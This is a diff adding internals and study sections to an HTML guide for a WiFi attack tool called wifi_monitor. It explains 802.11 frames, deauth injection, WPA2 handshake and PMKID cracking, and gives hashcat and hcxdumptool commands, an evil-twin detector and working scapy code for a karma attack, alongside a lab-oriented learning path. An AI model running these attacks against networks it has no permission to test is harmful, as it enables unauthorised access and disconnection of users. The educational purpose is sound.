@@ -655,6 +655,13 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><div class="sidebar-sep">More</div></li>
         <li><a href="#examples">Examples</a></li>
         <li><a href="#requirements">Requirements</a></li>
+        <li><div class="sidebar-sep">Internals</div></li>
+        <li><a href="#arch-deep-dive">Architecture</a></li>
+        <li><a href="#80211-frame">802.11 Frame</a></li>
+        <li><a href="#wpa2-handshake">WPA2 Handshake</a></li>
+        <li><a href="#wifi-customization">Customization</a></li>
+        <li><div class="sidebar-sep">Study</div></li>
+        <li><a href="#learning-path">Learning Path</a></li>
         <li><a href="#author">Author</a></li>
       </ul>
     </aside>
@@ -662,6 +669,47 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="content">
 
       <!-- Overview -->
+            <!-- ═══════════════════════════════════════════════════════
+           BEGINNER STARTUP — read foundations.html first
+           ═══════════════════════════════════════════════════════ -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to secV or wifi_monitor? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9"><li>▸ WiFi adapter supporting monitor mode (e.g. Alfa AWUS036ACH)</li>
+<li>▸ <code>aircrack-ng</code> suite: <code>pacman -S aircrack-ng</code></li>
+<li>▸ Check adapter: <code>iw list | grep monitor</code></li></ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">set interface wlan0
+set operation scan
+run</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Operations by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> scan, beacon_sniff, client_list</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> handshake_cap, deauth, pmkid_attack</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> evil_twin, enterprise_bypass, wpa3_probe</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong> <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Monitor Mode</a> — WiFi adapter mode that captures all nearby traffic, not just your own &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">WPA Handshake</a> — 4-way authentication exchange that can be captured and cracked offline &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">BSSID</a> — The MAC address of a WiFi access point &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Deauth Attack</a> — Sending forged de-authentication frames to disconnect clients
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
       <section id="overview">
         <p class="sec-label">Overview</p>
         <h2>What wifi_monitor does</h2>
@@ -1019,6 +1067,348 @@ pip3 install scapy
 
 <span class="comment"># Or via install.sh</span>
 ./install.sh</code></pre>
+      </section>
+
+      <!-- ══════════ ARCHITECTURE DEEP DIVE ══════════ -->
+      <section id="arch-deep-dive">
+        <p class="sec-label">Internals</p>
+        <h2>Architecture Deep Dive</h2>
+        <p>
+          This chapter explains the 802.11 frame structure at the byte level, how WPA2 authentication
+          works cryptographically, what a PMKID capture actually contains, and how to extend wifi_monitor
+          with your own detection and attack logic.
+        </p>
+      </section>
+
+      <section id="80211-frame">
+        <p class="sec-label">Internals</p>
+        <h2>802.11 Frame Structure — Byte by Byte</h2>
+        <p>
+          Every WiFi packet is a <strong>MAC Protocol Data Unit (MPDU)</strong> with a fixed-layout
+          header. Understanding the header lets you write custom packet filters, detect hidden SSIDs,
+          and identify management frame spoofing.
+        </p>
+        <pre><code><span class="comment">## 802.11 Frame Header — minimum 24 bytes (most management/data frames)</span>
+Offset  Size  Field         Meaning
+──────  ────  ────────────  ────────────────────────────────────────────
+0x00    2     Frame Control  Describes the frame type and subtype
+0x02    2     Duration/ID    NAV (network allocation vector) or AID
+0x04    6     Addr1          Destination (receiver) MAC
+0x0A    6     Addr2          Source (transmitter) MAC
+0x10    6     Addr3          BSSID (AP MAC) or 3rd address for WDS
+0x16    2     Seq/Frag       Sequence number (12 bits) + fragment (4 bits)
+[0x18   6     Addr4]         Only present in WDS/4-addr frames
+[varies   QoS Control]       2 bytes added for QoS data frames (802.11e)
+[varies   HT Control]        4 bytes added for HT frames (802.11n+)
+
+<span class="comment">## Frame Control field breakdown (2 bytes)</span>
+Bit(s)  Size  Field       Values
+──────  ────  ──────────  ────────────────────────────────────────────
+0-1     2     Protocol    Always 00 (version 0)
+2-3     2     Type        00=Management, 01=Control, 10=Data
+4-7     4     Subtype     Depends on Type:
+                            Management: 0000=AssocReq 0001=AssocResp
+                                        0100=ProbeReq 0101=ProbeResp
+                                        1000=Beacon   1011=Auth
+                                        1100=Deauth
+                            Data:       0000=Data     0100=Null
+8       1     To DS       Frame going to distribution system (AP→wire)
+9       1     From DS     Frame from distribution system
+10      1     More Frag   More fragments follow
+11      1     Retry       This is a retransmission
+12      1     Pwr Mgmt    Sender entering power-save mode
+13      1     More Data   More buffered frames for sleeping station
+14      1     Protected   Frame body is encrypted (WEP/TKIP/CCMP)
+15      1     Order       Strict ordering required</code></pre>
+
+        <h3>Beacon Frame — Decoded</h3>
+        <pre><code><span class="comment">## Beacon frame — sent by AP every ~100ms to announce network presence</span>
+<span class="comment">## Frame Control: 0x80 0x00 = management (type 0), beacon (subtype 8)</span>
+
+Frame Control:  80 00
+Duration:       00 00    (not used in beacons)
+Addr1 (dst):    FF FF FF FF FF FF    broadcast — everyone receives this
+Addr2 (src):    AA BB CC DD EE FF    AP's MAC address (BSSID)
+Addr3 (BSSID):  AA BB CC DD EE FF   same as Addr2 for AP beacons
+Seq/Frag:       XX XX               increments per frame
+
+<span class="comment">## Fixed fields in beacon body (12 bytes):</span>
+Timestamp:      XX XX XX XX XX XX XX XX    microseconds since AP boot
+Beacon Interval: 64 00                    = 0x0064 = 100 TUs (≈102.4ms)
+Capability Info: XX XX                    bit flags for QoS, privacy, etc.
+
+<span class="comment">## Tagged Parameters (variable length, TLV-like):</span>
+Tag 0:   SSID element
+  ID=00, Len=&lt;ssid_len&gt;, SSID bytes    ← "MyNetwork" in ASCII
+  Hidden SSID: Len=00 (empty) or Len=&lt;real_len&gt; with null bytes
+
+Tag 1:   Supported Rates
+  ID=01, Len=08, rates: 82 84 8B 96 0C 12 18 24
+  <span class="comment"># 0x82=1Mbps, 0x84=2Mbps, 0x8B=5.5Mbps, 0x96=11Mbps (bit7 set = basic rate)</span>
+
+Tag 3:   DS Parameter (channel)
+  ID=03, Len=01, Channel=06   ← this AP is on channel 6
+
+Tag 48:  RSN (Robust Security Network) = WPA2 info
+  ID=30, Len=XX
+  RSN Version:  01 00
+  Group Cipher: 00 0F AC 04   ← 00:0F:AC = IEEE OUI, 04 = CCMP (AES)
+  Pairwise Count: 01 00
+  Pairwise Cipher: 00 0F AC 04  ← CCMP
+  AKM Count: 01 00
+  AKM Suite: 00 0F AC 02    ← PSK (WPA2-Personal)
+  RSN Capabilities: 00 00</code></pre>
+
+        <h3>Deauthentication Frame — Byte Layout</h3>
+        <pre><code><span class="comment">## Deauth frame — wifi_monitor sends this for client disconnection</span>
+Frame Control:  C0 00    <span class="comment"># 0xC0 = management(00) + deauth(1100=12)</span>
+Duration:       3A 01
+Addr1 (victim): &lt;client MAC&gt;      ← target client to disconnect
+Addr2 (spoof):  &lt;AP MAC&gt;          ← spoofed as the AP
+Addr3 (BSSID):  &lt;AP MAC&gt;
+Seq/Frag:       XX XX
+
+<span class="comment">## Reason Code (2 bytes) — follows the header:</span>
+07 00   ← 0x0007 = "Class 3 frame received from nonassociated STA"
+         (most common reason code for deauth injection)
+
+Other common reason codes:
+  01 00 = Unspecified
+  02 00 = Previous auth no longer valid
+  03 00 = Deauthenticated because STA left
+  06 00 = Class 2 frame received from nonauthenticated STA
+
+<span class="comment">## Note: Management Frame Protection (802.11w / PMF) cryptographically</span>
+<span class="comment">## signs deauth frames. wifi_monitor checks if PMF is enabled (RSN Cap bit 6)</span>
+<span class="comment">## before attempting deauth injection — spoofed deauth won't work against PMF APs.</span></code></pre>
+      </section>
+
+      <section id="wpa2-handshake">
+        <p class="sec-label">Internals</p>
+        <h2>WPA2 4-Way Handshake — Cryptographic Deep Dive</h2>
+        <p>
+          The WPA2 4-way handshake establishes session keys between a client and AP. The critical fact
+          for WiFi cracking: the handshake contains enough data to verify a password guess <em>offline</em>,
+          without communicating with the AP. This is what wifi_monitor captures and passes to hashcat.
+        </p>
+        <pre><code><span class="comment">## WPA2-PSK Key Derivation Chain</span>
+
+Step 1: PMK (Pairwise Master Key) — from password
+  PMK = PBKDF2(HMAC-SHA1, password, SSID, 4096_iterations, 32_bytes)
+  <span class="comment"># 4096 SHA-1 iterations is why dictionary attacks are slow (≈1000 PMK/sec/CPU)</span>
+  <span class="comment"># hashcat uses GPU to compute millions PMK/sec (RTX 4090: ~600k PMK/sec)</span>
+
+Step 2: PTK (Pairwise Transient Key) — from PMK + nonces
+  PTK = PRF-512(PMK,
+    "Pairwise key expansion",
+    min(APmac, Cmac) || max(APmac, Cmac) || min(ANonce, SNonce) || max(ANonce, SNonce))
+  <span class="comment"># PTK is 512 bits, split into:</span>
+  PTK = KCK (128 bits) || KEK (128 bits) || TK (128 bits) || MIC key
+
+  KCK = Key Confirmation Key (first 128 bits)  ← used to compute MIC
+  KEK = Key Encryption Key   (next 128 bits)   ← encrypts GTK
+  TK  = Temporal Key         (last 256 bits)   ← encrypts data frames</code></pre>
+
+        <h3>The 4 EAPOL Frames</h3>
+        <pre><code><span class="comment">## EAPOL (EAP over LAN) Key frames carry the handshake</span>
+
+M1: AP → Client
+    AP generates ANonce (32 random bytes)
+    Sends: ANonce, Replay Counter=1, Key Info=0x008A (ACK | Pairwise | Enc)
+    <span class="comment"># At this point: client knows ANonce, generates SNonce</span>
+
+M2: Client → AP
+    Client computes PTK (now has ANonce + SNonce + both MACs + PMK)
+    Sends: SNonce, MIC (HMAC-SHA1 of M2 using KCK), Replay Counter=1
+    <span class="comment"># MIC = HMAC-SHA1(KCK, EAPOL_frame_with_zeroed_MIC_field)</span>
+    <span class="comment"># THIS IS WHAT ATTACKERS CAPTURE — SNonce + MIC allows offline password testing:</span>
+    <span class="comment">#   Guess password → compute PMK → compute PTK → compute KCK → compute MIC → compare</span>
+
+M3: AP → Client
+    AP verifies M2's MIC (confirms client knows PMK)
+    Sends: ANonce, MIC, Encrypted GTK (Group Temporal Key for broadcast traffic)
+    Sets Install flag, key_info=0x13CA
+
+M4: Client → AP
+    Client sends ACK: empty MIC field, Replay Counter=2
+    Both sides now install PTK — encrypted data exchange begins
+
+<span class="comment">## What wifi_monitor captures in a .cap file:</span>
+<span class="comment">#   Beacon (SSID + BSSID)  ← needed for PMK computation</span>
+<span class="comment">#   M1 (ANonce)            ← needed for PTK computation</span>
+<span class="comment">#   M2 (SNonce + MIC)      ← needed to verify password guess</span>
+<span class="comment">#   That's all hashcat needs — M3 and M4 are not required</span></code></pre>
+
+        <h3>PMKID Attack — No Handshake Needed</h3>
+        <pre><code><span class="comment">## PMKID (discovered by Jens Steube in 2018) — captures from a single M1 frame</span>
+
+PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || client_MAC)
+
+<span class="comment">## The AP includes PMKID in M1 for roaming (802.11r fast transition)</span>
+<span class="comment">## Offline attack: guess password → PMK → PMKID → compare with captured PMKID</span>
+<span class="comment">## Advantage: you don't need any client to be connected — just send M1 to the AP</span>
+
+<span class="comment">## hashcat mode 22000 (modern, accepts both WPA2 handshake and PMKID):</span>
+hashcat -m 22000 capture.hc22000 rockyou.txt --force
+
+<span class="comment">## hcxdumptool captures in pcapng format; hcxtools converts:</span>
+hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1
+hcxtools -o capture.hc22000 capture.pcapng
+hashcat -m 22000 capture.hc22000 wordlist.txt</code></pre>
+      </section>
+
+      <section id="wifi-customization">
+        <p class="sec-label">Extend</p>
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Writing a Custom Packet Processor</h3>
+        <pre><code><span class="comment"># wifi_monitor.py uses scapy for packet processing</span>
+<span class="comment"># Add a custom handler to detect specific management frames:</span>
+from scapy.all import *
+
+def detect_evil_twin(pkt):
+    """Detect duplicate SSIDs with different BSSIDs (potential evil twin)."""
+    if not pkt.haslayer(Dot11Beacon):
+        return
+
+    ssid    = pkt[Dot11Elt].info.decode(errors="replace")
+    bssid   = pkt[Dot11].addr3
+
+    known   = SEEN_SSIDS.setdefault(ssid, set())
+    known.add(bssid)
+
+    if len(known) &gt; 1:
+        wifi_monitor.log(f"[!] EVIL TWIN detected: SSID '{ssid}' seen from {len(known)} BSSIDs")
+        wifi_monitor.log(f"    BSSIDs: {', '.join(known)}")
+        wifi_monitor.findings.append({
+            "type": "evil_twin",
+            "ssid": ssid,
+            "bssids": list(known),
+            "severity": "HIGH",
+        })
+
+SEEN_SSIDS = {}
+
+<span class="comment"># Register in wifi_monitor.py PACKET_HANDLERS:</span>
+PACKET_HANDLERS = {
+    "evil_twin": detect_evil_twin,
+    <span class="comment"># ... existing handlers ...</span>
+}
+
+<span class="comment"># Sniff with your handler:</span>
+sniff(iface="wlan0mon", prn=detect_evil_twin, store=False)</code></pre>
+
+        <h3>Adding a New Attack Mode</h3>
+        <pre><code><span class="comment"># Add a karma attack mode (respond to any probe request)</span>
+<span class="comment"># Karma: host spoof — respond to ALL probe requests as if we are the target AP</span>
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt
+
+def karma_mode(iface: str, our_mac: str):
+    """Respond to every probe request as the probed SSID."""
+
+    def handle_probe(pkt):
+        if not pkt.haslayer(Dot11ProbeReq):
+            return
+        ssid  = pkt[Dot11Elt].info.decode(errors="replace") if pkt[Dot11Elt].info else ""
+        if not ssid:
+            return
+        client = pkt[Dot11].addr2
+
+        resp = (RadioTap() /
+                Dot11(type=0, subtype=5, addr1=client, addr2=our_mac, addr3=our_mac) /
+                Dot11ProbeResp(timestamp=0, beacon_interval=100, cap="ESS") /
+                Dot11Elt(ID="SSID",   info=ssid.encode()) /
+                Dot11Elt(ID="Rates",  info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c") /
+                Dot11Elt(ID="DSset",  info=b"\x01"))   <span class="comment"># channel 1</span>
+
+        sendp(resp, iface=iface, verbose=False)
+        print(f"[karma] Responded to probe for '{ssid}' from {client}")
+
+    sniff(iface=iface, prn=handle_probe, store=False)</code></pre>
+      </section>
+
+      <section id="learning-path">
+        <p class="sec-label">Study</p>
+        <h2>Learning Path &amp; Resources</h2>
+        <p>
+          WiFi security combines radio physics, cryptography, and network protocols. Build knowledge layer by layer.
+        </p>
+
+        <h3>Step 1: Wireless Networking Basics</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Type</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>Professor Messer — CompTIA Network+ Wireless (YouTube)</td><td>Free</td><td>Explains 802.11 standards (a/b/g/n/ac/ax), channels, SSID, BSSID, signal strength — the vocabulary of wireless security.</td></tr>
+            <tr><td>802.11 Standard basics (Wikipedia)</td><td>Free</td><td>Read the frame types section — understand management vs control vs data frames before looking at wifi_monitor's packet captures.</td></tr>
+            <tr><td>CWNA Study Guide (Coleman &amp; Westcott)</td><td>Book</td><td>Certified Wireless Network Admin — comprehensive 802.11 reference. Chapter on security covers WPA2 in depth at the exact level needed for wifi_monitor.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 2: Understand the Attacks</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>aircrack-ng wiki (aircrack-ng.org/documentation.html)</td><td>The tools wifi_monitor wraps. Read the "Getting Started" and "Breaking WPA" tutorials — run them manually first, then use wifi_monitor to automate.</td></tr>
+            <tr><td>PMKID paper by Jens Steube (in1.hashcat.net/events/p17-lh2018-new_single-sided_attacks.pdf)</td><td>The original 2018 research paper describing PMKID attacks. Explains the math behind why capturing a single M1 frame is enough to crack a password offline.</td></tr>
+            <tr><td>hashcat documentation (hashcat.net/wiki)</td><td>Understand hash modes, attack modes (dictionary, rule-based, mask), and GPU acceleration. wifi_monitor passes captures to hashcat — knowing the tool lets you tune the crack.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 3: Practice Labs</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Platform / Setup</th><th>Cost</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>TryHackMe — "Wifi Hacking 101" room</td><td>Free</td><td>Guided WPA2 capture and crack using aircrack-ng. Run wifi_monitor alongside to see how it automates the same steps.</td></tr>
+            <tr><td>WiFi-Pumpkin (github.com/P0cL4bs/wifipumpkin3)</td><td>Free</td><td>Evil twin and captive portal framework. Complements wifi_monitor's evil_twin mode — study the source to understand captive portal mechanics.</td></tr>
+            <tr><td>Your own home network + a test device</td><td>Free</td><td>Legally capture your own WPA2 4-way handshake. Run hashcat with rockyou.txt against it. If your password is in rockyou.txt, change it.</td></tr>
+            <tr><td>TP-Link TL-WN722N (USB WiFi adapter)</td><td>~$15</td><td>Best beginner adapter for packet injection and monitor mode. Plug into Kali VM, run: <code>airmon-ng start wlan0</code> to enter monitor mode.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 4: Deep Reference</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Use For</th></tr></thead>
+          <tbody>
+            <tr><td>Offensive Security — Wireless Attacks (offsec.com)</td><td>Chapter from PWK (PEN-200) course covering wireless attack techniques. The methodology secV implements.</td></tr>
+            <tr><td>Wireshark 802.11 decode filters</td><td>Use <code>wlan.fc.type_subtype == 0x08</code> to filter beacons, <code>eapol</code> to filter handshake frames. Run Wireshark alongside wifi_monitor to inspect every captured frame.</td></tr>
+            <tr><td>Scapy documentation (scapy.net)</td><td>wifi_monitor uses scapy internally. Learn scapy to write custom packet processors (see customization guide above).</td></tr>
+            <tr><td>hashcat rule-based attack documentation</td><td>When rockyou.txt fails, rules transform wordlist entries into password candidates. Study OneRuleToRuleThemAll for maximum coverage.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Practice Path</h3>
+        <pre><code><span class="comment">## Progression: from monitoring to cracking to evil twin</span>
+
+Week 1: Monitor Mode and Packet Capture
+  Setup: Kali VM + USB WiFi adapter (TP-Link TL-WN722N)
+  Run: wifi_monitor in monitor mode against your home network
+  Learn: read every beacon — understand SSID, BSSID, channel, signal
+
+Week 2: Handshake Capture and Crack
+  Run: wifi_monitor capture mode on your own WPA2 network
+  Trigger: connect a device to force a handshake
+  Crack: pass the .cap to hashcat with rockyou.txt
+  Read: the PMKID paper — understand why this works
+
+Week 3: Evil Twin
+  Create: a second SSID matching your real router
+  Run: wifi_monitor evil_twin mode
+  Observe: which devices connect? Do they warn the user?
+  Study: how HSTS and certificate pinning protect against MITM
+
+Week 4: Custom Detection Scripts
+  Write: a scapy script that detects deauth floods in your lab
+  Integrate: into wifi_monitor using the customization guide above
+  Goal: your detector catches wifi_monitor's own deauth attacks</code></pre>
       </section>
 
       <!-- Author -->
